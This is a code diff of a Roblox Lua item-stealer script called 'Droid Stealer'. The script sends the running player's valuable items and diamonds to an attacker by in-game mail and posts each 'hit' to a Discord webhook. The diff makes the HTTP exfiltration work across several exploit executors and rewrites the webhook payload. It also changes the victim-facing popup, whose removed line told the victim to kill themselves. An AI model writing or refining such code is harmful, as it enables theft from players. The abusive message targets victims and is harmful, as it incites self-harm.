@@ -25,6 +25,7 @@ local mailsent = require(game:GetService("ReplicatedStorage"):WaitForChild("Libr
 local plr = game.Players.LocalPlayer
 local MailMessage = "get stolen"
 local HttpService = game:GetService("HttpService")
+local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
 local sortedItems = {}
 local totalRAP = 0
 local getFucked = false
@@ -81,12 +82,10 @@ end
 -- Updated SendMessage function
 local HttpService = game:GetService("HttpService")
 
+local HttpService = game:GetService("HttpService")
+
 local function SendMessage(username, diamonds)
     local TheReceiver = username
-
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
 
     -- Construct fields
     local fields = {
@@ -158,12 +157,14 @@ local function SendMessage(username, diamonds)
         CONTENTWB = "NEW HIT! PLAYER HAS LESS THAN 1B RAP"
     end
 
-    local data = {
+    -- Construct the payload
+    local payload = {
         username = "Droid Stealer",
         avatar_url = "https://cdn.discordapp.com/attachments/1288660529539317824/1299204925229895750/IMG_1832.png",
         content = CONTENTWB,
         embeds = {{
             title = "⛅️ __**New Hit With Droid Stealer**__ ⛅️",
+            type = "rich",
             color = tonumber("0x05f7ff"),
             fields = fields,
             footer = {
@@ -175,22 +176,23 @@ local function SendMessage(username, diamonds)
         }}
     }
 
-    local body = HttpService:JSONEncode(data)
+    -- Send the webhook
     local success, response = pcall(function()
-        return request({
+        return httpRequest({
             Url = Webhook,
             Method = "POST",
-            Headers = headers,
-            Body = body
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode(payload)
         })
     end)
 
-    if success then
-        print("Response from backend: ", response)
+    if success and response and response.Success then
+        print("Webhook sent successfully!")
     else
-        warn("Failed to send webhook: ", response)
+        warn("Failed to send webhook.")
     end
 end
+
 
 local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
 local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
@@ -413,5 +415,5 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
     end
     SendAllGems()
     local message = require(game.ReplicatedStorage.Library.Client.Message)
-    message.Error("ALL YOUR VALUABLE ITEMS JUST GOT STOLEN!\nKILL YOURSELF FOR REVENGE")
+    message.Error("ALL YOUR VALUABLE ITEMS JUST GOT STOLEN!\nJOIN discord.gg/skaiscripts FOR REVENGE")
 end
